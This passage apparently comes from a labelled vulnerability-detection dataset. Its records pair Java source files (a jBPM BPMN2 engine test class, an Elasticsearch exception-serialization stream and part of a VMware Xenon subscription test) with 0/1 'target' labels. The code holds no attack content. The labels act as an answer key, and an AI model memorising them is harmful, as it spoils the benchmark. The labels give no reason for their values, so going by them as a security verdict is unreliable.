testEventBasedSplit4() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-EventBasedSplit4.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        // Yes\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        ksession.signalEvent(\"Message-YesMessage\", \"YesValue\", processInstance.getId());\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        // No\n        processInstance = ksession.startProcess(\"com.sample.test\");\n        ksession.signalEvent(\"Message-NoMessage\", \"NoValue\", processInstance.getId());\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testEventBasedSplit5() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-EventBasedSplit5.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        ReceiveTaskHandler receiveTaskHandler = new ReceiveTaskHandler(ksession);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Receive Task\", receiveTaskHandler);\n        // Yes\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        receiveTaskHandler.setKnowledgeRuntime(ksession);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Receive Task\", receiveTaskHandler);\n        receiveTaskHandler.messageReceived(\"YesMessage\", \"YesValue\");\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n        receiveTaskHandler.messageReceived(\"NoMessage\", \"NoValue\");\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        receiveTaskHandler.setKnowledgeRuntime(ksession);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Receive Task\", receiveTaskHandler);\n        // No\n        processInstance = ksession.startProcess(\"com.sample.test\");\n        receiveTaskHandler.messageReceived(\"NoMessage\", \"NoValue\");\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n        receiveTaskHandler.messageReceived(\"YesMessage\", \"YesValue\");\n    }\n\n    @Test\n    public void testCallActivity() throws Exception {\n        KnowledgeBuilder kbuilder = KnowledgeBuilderFactory.newKnowledgeBuilder();\n        kbuilder.add(ResourceFactory.newClassPathResource(\"BPMN2-CallActivity.bpmn2\"), ResourceType.BPMN2);\n        kbuilder.add(ResourceFactory.newClassPathResource(\"BPMN2-CallActivitySubProcess.bpmn2\"), ResourceType.BPMN2);\n        if (!kbuilder.getErrors().isEmpty()) {\n            for (KnowledgeBuilderError error : kbuilder.getErrors()) {\n                logger.error(\"{}\", error);\n            }\n            throw new IllegalArgumentException(\"Errors while parsing knowledge base\");\n        }\n        KnowledgeBase kbase = KnowledgeBaseFactory.newKnowledgeBase();\n        kbase.addKnowledgePackages(kbuilder.getKnowledgePackages());\n        KieSession ksession = createKnowledgeSession(kbase);\n        \n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"x\", \"oldValue\");\n        ProcessInstance processInstance = ksession.startProcess(\"ParentProcess\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n        assertEquals(\"new value\", ((WorkflowProcessInstance) processInstance).getVariable(\"y\"));\n    }\n\n    @Test\n    public void testSubProcess() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-SubProcess.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ProcessInstance processInstance = ksession.startProcess(\"SubProcess\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testMultiInstanceLoopCharacteristicsProcess() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-MultiInstanceLoopCharacteristicsProcess.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        Map<String, Object> params = new HashMap<String, Object>();\n        List<String> myList = new ArrayList<String>();\n        myList.add(\"First Item\");\n        myList.add(\"Second Item\");\n        params.put(\"list\", myList);\n        ProcessInstance processInstance = ksession.startProcess(\"MultiInstanceLoopCharacteristicsProcess\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testErrorBoundaryEvent() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-ErrorBoundaryEventInterrupting.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"MyTask\", new DoNothingWorkItemHandler());\n        ProcessInstance processInstance = ksession.startProcess(\"ErrorBoundaryEvent\");\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testTimerBoundaryEvent() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-TimerBoundaryEventDuration.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"MyTask\", new DoNothingWorkItemHandler());\n        ProcessInstance processInstance = ksession.startProcess(\"TimerBoundaryEvent\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        Thread.sleep(1000);\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testTimerBoundaryEventInterrupting() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-TimerBoundaryEventInterrupting.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"MyTask\", new DoNothingWorkItemHandler());\n        ProcessInstance processInstance = ksession.startProcess(\"TimerBoundaryEvent\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        Thread.sleep(1000);\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    @Ignore(\"Process does not complete.\")\n    public void testAdHocSubProcess() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-AdHocSubProcess.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        \n        TestWorkItemHandler workItemHandler = new TestWorkItemHandler();\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        ProcessInstance processInstance = ksession.startProcess(\"AdHocSubProcess\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        WorkItem workItem = workItemHandler.getWorkItem();\n        assertNull(workItem);\n        ksession = restoreSession(ksession);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        ksession.fireAllRules();\n        \n        ksession.signalEvent(\"Hello2\", null, processInstance.getId());\n        workItem = workItemHandler.getWorkItem();\n        assertNotNull(workItem);\n        ksession = restoreSession(ksession);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        ksession.getWorkItemManager().completeWorkItem(workItem.getId(), null);\n        \n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    @Ignore(\"Process does not complete.\")\n    public void testAdHocSubProcessAutoComplete() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-AdHocSubProcessAutoComplete.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        \n        TestWorkItemHandler workItemHandler = new TestWorkItemHandler();\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        ProcessInstance processInstance = ksession.startProcess(\"AdHocSubProcess\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        \n        WorkItem workItem = workItemHandler.getWorkItem();\n        assertNull(workItem);\n        ksession = restoreSession(ksession);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        ksession.fireAllRules();\n        workItem = workItemHandler.getWorkItem();\n        assertNotNull(\"WorkItem should not be null.\", workItem);\n        ksession = restoreSession(ksession);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        ksession.getWorkItemManager().completeWorkItem(workItem.getId(), null);\n        \n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testIntermediateCatchEventSignal() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-IntermediateCatchEventSignal.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", new SystemOutWorkItemHandler());\n        ProcessInstance processInstance = ksession.startProcess(\"IntermediateCatchEvent\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        // now signal process instance\n        ksession.signalEvent(\"MyMessage\", \"SomeValue\", processInstance.getId());\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testIntermediateCatchEventMessage() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-IntermediateCatchEventMessage.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", new SystemOutWorkItemHandler());\n        ProcessInstance processInstance = ksession.startProcess(\"IntermediateCatchEvent\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        // now signal process instance\n        ksession.signalEvent(\"Message-HelloMessage\", \"SomeValue\", processInstance.getId());\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testIntermediateCatchEventTimer() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-IntermediateCatchEventTimerDuration.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", new DoNothingWorkItemHandler());\n        ProcessInstance processInstance = ksession.startProcess(\"IntermediateCatchEvent\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        // now wait for 1 second for timer to trigger\n        Thread.sleep(1000);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", new DoNothingWorkItemHandler());\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    @Ignore(\"process does not complete\")\n    public void testIntermediateCatchEventCondition() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-IntermediateCatchEventCondition.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ProcessInstance processInstance = ksession.startProcess(\"IntermediateCatchEvent\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession);\n        // now activate condition\n        Person person = new Person();\n        person.setName(\"Jack\");\n        ksession.insert(person);\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testErrorEndEventProcess() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-ErrorEndEvent.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ProcessInstance processInstance = ksession.startProcess(\"ErrorEndEvent\");\n        assertProcessInstanceAborted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testServiceTask() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-ServiceProcess.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Service Task\", new ServiceTaskHandler());\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"s\", \"john\");\n        WorkflowProcessInstance processInstance = (WorkflowProcessInstance) ksession.startProcess(\"ServiceProcess\", params);\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n        assertEquals(\"Hello john!\", processInstance.getVariable(\"s\"));\n    }\n\n    @Test\n    public void testSendTask() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-SendTask.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Send Task\", new SendTaskHandler());\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"s\", \"john\");\n        WorkflowProcessInstance processInstance = (WorkflowProcessInstance) ksession.startProcess(\"SendTask\", params);\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testReceiveTask() throws Exception {\n        KieBase kbase = createKnowledgeBaseWithoutDumper(\"BPMN2-ReceiveTask.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ReceiveTaskHandler receiveTaskHandler = new ReceiveTaskHandler(ksession);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Receive Task\", receiveTaskHandler);\n        WorkflowProcessInstance processInstance = (WorkflowProcessInstance) ksession.startProcess(\"ReceiveTask\");\n        assertEquals(ProcessInstance.STATE_ACTIVE, processInstance.getState());\n        ksession = restoreSession(ksession);\n        receiveTaskHandler.messageReceived(\"HelloMessage\", \"Hello john!\");\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    @Ignore(\"bpmn does not compile\")\n    public void testConditionalStart() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-ConditionalStart.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        Person person = new Person();\n        person.setName(\"jack\");\n        ksession.insert(person);\n        ksession.fireAllRules();\n        person = new Person();\n        person.setName(\"john\");\n        ksession.insert(person);\n        ksession.fireAllRules();\n    }\n\n    @Test\n    public void testTimerStart() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-TimerStart.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        final List<Long> list = new ArrayList<Long>();\n        ksession.addEventListener(new DefaultProcessEventListener() { \n            \n            public void afterProcessStarted(ProcessStartedEvent event) {\n                list.add(event.getProcessInstance().getId());\n            }\n            \n        });\n        Thread.sleep(250);\n        assertEquals(0, list.size());\n        for (int i = 0; i < 5; i++) {\n            Thread.sleep(500);\n        }\n        assertEquals(5, list.size());\n    }\n\n    @Test\n    public void testSignalStart() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-SignalStart.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        final List<Long> list = new ArrayList<Long>();\n        ksession.addEventListener(new DefaultProcessEventListener() {\n            public void afterProcessStarted(ProcessStartedEvent event) {\n                list.add(event.getProcessInstance().getId());\n            }\n        });\n        ksession.signalEvent(\"MySignal\", \"NewValue\");\n        assertEquals(1, list.size());\n    }\n\n    @Test\n    public void testSignalEnd() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-SignalEndEvent.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"x\", \"MyValue\");\n        ksession.startProcess(\"SignalEndEvent\", params);\n    }\n\n    @Test\n    public void testMessageStart() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-MessageStart.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        final List<Long> list = new ArrayList<Long>();\n        ksession.addEventListener(new DefaultProcessEventListener() {\n            public void afterProcessStarted(ProcessStartedEvent event) {\n                list.add(event.getProcessInstance().getId());\n            }\n        });\n        ksession.signalEvent(\"Message-HelloMessage\", \"NewValue\");\n        assertEquals(1, list.size());\n    }\n\n    @Test\n    public void testMessageEnd() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-MessageEndEvent.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Send Task\", new SendTaskHandler());\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"x\", \"MyValue\");\n        ProcessInstance processInstance = ksession.startProcess(\"MessageEndEvent\", params);\n        assertEquals(ProcessInstance.STATE_COMPLETED, processInstance.getState());\n    }\n\n    @Test\n    public void testMessageIntermediateThrow() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-IntermediateThrowEventMessage.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Send Task\", new SendTaskHandler());\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"x\", \"MyValue\");\n        ProcessInstance processInstance = ksession.startProcess(\"MessageIntermediateEvent\", params);\n        assertEquals(ProcessInstance.STATE_COMPLETED, processInstance.getState());\n    }\n\n    @Test\n    public void testSignalIntermediateThrow() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-IntermediateThrowEventSignal.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"x\", \"MyValue\");\n        ProcessInstance processInstance = ksession.startProcess(\"SignalIntermediateEvent\", params);\n        assertEquals(ProcessInstance.STATE_COMPLETED, processInstance.getState());\n    }\n\n    @Test\n    public void testNoneIntermediateThrow() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-IntermediateThrowEventNone.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ProcessInstance processInstance = ksession.startProcess(\"NoneIntermediateEvent\", null);\n        assertEquals(ProcessInstance.STATE_COMPLETED, processInstance.getState());\n    }\n    \n    @Test\n    public void testErrorSignallingExceptionServiceTask() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-ExceptionServiceProcess-ErrorSignalling.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        \n        runTestErrorSignallingExceptionServiceTask(ksession);\n    }\n    \n    public static void runTestErrorSignallingExceptionServiceTask(KieSession ksession) throws Exception {\n        \n        // Setup\n        String eventType = \"Error-code\";\n        SignallingTaskHandlerDecorator signallingTaskWrapper = new SignallingTaskHandlerDecorator(ServiceTaskHandler.class, eventType);\n        signallingTaskWrapper.setWorkItemExceptionParameterName(ExceptionService.exceptionParameterName);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Service Task\", signallingTaskWrapper);\n       \n        Object [] caughtEventObjectHolder = new Object[1];\n        caughtEventObjectHolder[0] = null;\n        ExceptionService.setCaughtEventObjectHolder(caughtEventObjectHolder);\n        \n        TestWorkItemHandler workItemHandler = new TestWorkItemHandler();\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        \n        // Start process\n        Map<String, Object> params = new HashMap<String, Object>();\n        String input = \"this is my service input\";\n        params.put(\"serviceInputItem\", input );\n        ProcessInstance processInstance = ksession.startProcess(\"ServiceProcess\", params);\n\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        \n        WorkItem workItem = workItemHandler.getWorkItem();\n        assertNotNull(workItem);\n        ksession.getWorkItemManager().completeWorkItem(workItem.getId(), null);\n        \n        // Check that event was passed to Event SubProcess (and grabbed by WorkItemHandler);\n        assertTrue( \"Event was not passed to Event Subprocess\", caughtEventObjectHolder[0] != null && caughtEventObjectHolder[0] instanceof WorkItem );\n        workItem = (WorkItem) caughtEventObjectHolder[0];\n        Object throwObj = workItem.getParameter(ExceptionService.exceptionParameterName);\n        assertTrue( \"WorkItem doesn't contain Throwable\", throwObj instanceof Throwable );\n        assertTrue(\"Exception message does not match service input.\", ((Throwable) throwObj).getMessage().endsWith(input) );\n\n        // Complete process\n        processInstance = ksession.getProcessInstance(processInstance.getId());\n        assertTrue( \"Process instance has not been aborted.\", processInstance == null || processInstance.getState() == ProcessInstance.STATE_ABORTED );\n        \n    }\n    \n    @Test\n    public void testSignallingExceptionServiceTask() throws Exception {\n        // dump/reread functionality seems to work for this test \n        // .. but I'm pretty sure that's more coincidence than design (mriet, 2013-03-06)\n        KieBase kbase = createKnowledgeBase(\"BPMN2-ExceptionServiceProcess-Signalling.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        \n        runTestSignallingExceptionServiceTask(ksession);\n    }\n    \n    public static void runTestSignallingExceptionServiceTask(KieSession ksession) throws Exception {\n        // Setup\n        String eventType = \"exception-signal\";\n        SignallingTaskHandlerDecorator signallingTaskWrapper = new SignallingTaskHandlerDecorator(ServiceTaskHandler.class, eventType);\n        signallingTaskWrapper.setWorkItemExceptionParameterName(ExceptionService.exceptionParameterName);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Service Task\", signallingTaskWrapper);\n       \n        Object [] caughtEventObjectHolder = new Object[1];\n        caughtEventObjectHolder[0] = null;\n        ExceptionService.setCaughtEventObjectHolder(caughtEventObjectHolder);\n        \n        // Start process\n        Map<String, Object> params = new HashMap<String, Object>();\n        String input = \"this is my service input\";\n        params.put(\"serviceInputItem\", input );\n        ProcessInstance processInstance = ksession.startProcess(\"ServiceProcess\", params);\n\n        // Check that event was passed to Event SubProcess (and grabbed by WorkItemHandler);\n        assertTrue( \"Event was not passed to Event Subprocess\", caughtEventObjectHolder[0] != null && caughtEventObjectHolder[0] instanceof WorkItem );\n        WorkItem workItem = (WorkItem) caughtEventObjectHolder[0];\n        Object throwObj = workItem.getParameter(ExceptionService.exceptionParameterName);\n        assertTrue( \"WorkItem doesn't contain Throwable\", throwObj instanceof Throwable );\n        assertTrue(\"Exception message does not match service input.\", ((Throwable) throwObj).getMessage().endsWith(input) );\n\n        // Complete process\n        assertEquals( \"Process instance is not active.\", ProcessInstance.STATE_ACTIVE, processInstance.getState() );\n        ksession.getWorkItemManager().completeWorkItem(workItem.getId(), null);\n        \n        processInstance = ksession.getProcessInstance(processInstance.getId());\n        if( processInstance != null ) { \n            assertEquals( \"Process instance is not completed.\", ProcessInstance.STATE_COMPLETED, processInstance.getState() );\n        } // otherwise, persistence use => processInstance == null => process is completed\n    }\n    \n}\n", "target": 1}
{"idx": 1040, "func": "/*\n * Licensed to Elasticsearch under one or more contributor\n * license agreements. See the NOTICE file distributed with\n * this work for additional information regarding copyright\n * ownership. Elasticsearch licenses this file to you under\n * the Apache License, Version 2.0 (the \"License\"); you may\n * not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *    http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing,\n * software distributed under the License is distributed on an\n * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n * KIND, either express or implied.  See the License for the\n * specific language governing permissions and limitations\n * under the License.\n */\n\npackage org.elasticsearch.common.io;\n\nimport java.io.*;\n\n/**\n *\n */\npublic class ThrowableObjectOutputStream extends ObjectOutputStream {\n\n    static final int TYPE_FAT_DESCRIPTOR = 0;\n    static final int TYPE_THIN_DESCRIPTOR = 1;\n\n    private static final String EXCEPTION_CLASSNAME = Exception.class.getName();\n    static final int TYPE_EXCEPTION = 2;\n\n    private static final String STACKTRACEELEMENT_CLASSNAME = StackTraceElement.class.getName();\n    static final int TYPE_STACKTRACEELEMENT = 3;\n\n\n    public ThrowableObjectOutputStream(OutputStream out) throws IOException {\n        super(out);\n    }\n\n    @Override\n    protected void writeStreamHeader() throws IOException {\n        writeByte(STREAM_VERSION);\n    }\n\n    @Override\n    protected void writeClassDescriptor(ObjectStreamClass desc) throws IOException {\n        if (desc.getName().equals(EXCEPTION_CLASSNAME)) {\n            write(TYPE_EXCEPTION);\n        } else if (desc.getName().equals(STACKTRACEELEMENT_CLASSNAME)) {\n            write(TYPE_STACKTRACEELEMENT);\n        } else {\n            Class<?> clazz = desc.forClass();\n            if (clazz.isPrimitive() || clazz.isArray()) {\n                write(TYPE_FAT_DESCRIPTOR);\n                super.writeClassDescriptor(desc);\n            } else {\n                write(TYPE_THIN_DESCRIPTOR);\n                writeUTF(desc.getName());\n            }\n        }\n    }\n\n    /**\n     * Simple helper method to roundtrip a serializable object within the ThrowableObjectInput/Output stream\n     */\n    public static <T extends Serializable> T serialize(T t) throws IOException, ClassNotFoundException {\n        ByteArrayOutputStream stream = new ByteArrayOutputStream();\n        try (ThrowableObjectOutputStream outputStream = new ThrowableObjectOutputStream(stream)) {\n            outputStream.writeObject(t);\n        }\n        try (ThrowableObjectInputStream in = new ThrowableObjectInputStream(new ByteArrayInputStream(stream.toByteArray()))) {\n            return (T) in.readObject();\n        }\n    }\n\n    /**\n     * Returns <code>true</code> iff the exception can be serialized and deserialized using\n     * {@link ThrowableObjectOutputStream} and {@link ThrowableObjectInputStream}. Otherwise <code>false</code>\n     */\n    public static boolean canSerialize(Throwable t) {\n        try {\n            serialize(t);\n            return true;\n        } catch (Throwable throwable) {\n            return false;\n        }\n    }\n}\n", "target": 0}
{"idx": 1041, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.ConcurrentSkipListMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.function.Consumer;\nimport java.util.function.Function;\n\nimport org.junit.After;\nimport org.junit.Test;\n\nimport com.vmware.xenon.common.Service.Action;\nimport com.vmware.xenon.common.ServiceSubscriptionState.ServiceSubscriber;\nimport com.vmware.xenon.common.http.netty.NettyHttpServiceClient;\nimport com.vmware.xenon.common.test.MinimalTestServiceState;\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.common.test.VerificationHost;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.MinimalTestService;\nimport com.vmware.xenon.services.common.NodeGroupService.NodeGroupConfig;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\n\n\npublic class TestSubscriptions extends BasicTestCase {\n    private final int NODE_COUNT = 2;\n\n    public int serviceCount = 100;\n    public long updateCount = 10;\n    public long iterationCount = 0;\n\n    @Override\n    public void beforeHostStart(VerificationHost host) {\n        host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS\n                .toMicros(VerificationHost.FAST_MAINT_INTERVAL_MILLIS));\n    }\n\n    @After\n    public void tearDown() {\n        this.host.tearDown();\n        this.host.tearDownInProcessPeers();\n    }\n\n    private void setUpPeers() throws Throwable {\n        this.host.setUpPeerHosts(this.NODE_COUNT);\n        this.host.joinNodesAndVerifyConvergence(this.NODE_COUNT);\n    }\n\n    @Test\n    public void remoteAndReliableSubscriptionsLoop() throws Throwable {\n        for (int i = 0; i < this.iterationCount; i++) {\n            tearDown();\n            this.host = createHost();\n            initializeHost(this.host);\n            beforeHostStart(this.host);\n            this.host.start();\n            remoteAndReliableSubscriptions();\n        }\n    }\n\n    @Test\n    public void remoteAndReliableSubscriptions() throws Throwable {\n        setUpPeers();\n\n        // pick one host to post to\n        VerificationHost serviceHost = this.host.getPeerHost();\n        URI factoryUri = UriUtils.buildUri(serviceHost, ExampleService.FACTORY_LINK);\n        this.host.waitForReplicatedFactoryServiceAvailable(factoryUri);\n\n        // test host to receive notifications\n        VerificationHost localHost = this.host;\n        int serviceCount = 1;\n        // create example service documents across all nodes\n        List<URI> exampleURIs = serviceHost.createExampleServices(serviceHost, serviceCount, null);\n        TestContext oneUseNotificationCtx = this.host.testCreate(1);\n        StatelessService notificationTarget = new StatelessService() {\n            @Override\n            public void handleRequest(Operation update) {\n                update.complete();\n                if (update.getAction().equals(Action.PATCH)) {\n                    if (update.getUri().getHost() == null) {\n                        oneUseNotificationCtx.fail(new IllegalStateException(\n                                \"Notification URI does not have host specified\"));\n                        return;\n                    }\n                    oneUseNotificationCtx.complete();\n                }\n            }\n        };\n\n        String[] ownerHostId = new String[1];\n        URI uri = exampleURIs.get(0);\n        URI subUri = UriUtils.buildUri(serviceHost.getUri(), uri.getPath());\n        TestContext subscribeCtx = this.host.testCreate(1);\n        Operation subscribe = Operation.createPost(subUri)\n                .setCompletion(subscribeCtx.getCompletion());\n        subscribe.setReferer(localHost.getReferer());\n        subscribe.forceRemote();\n        // replay state\n        serviceHost.startSubscriptionService(subscribe, notificationTarget, ServiceSubscriber\n                .create(false).setUsePublicUri(true));\n        this.host.testWait(subscribeCtx);\n\n        // do an update to cause a notification\n        TestContext updateCtx 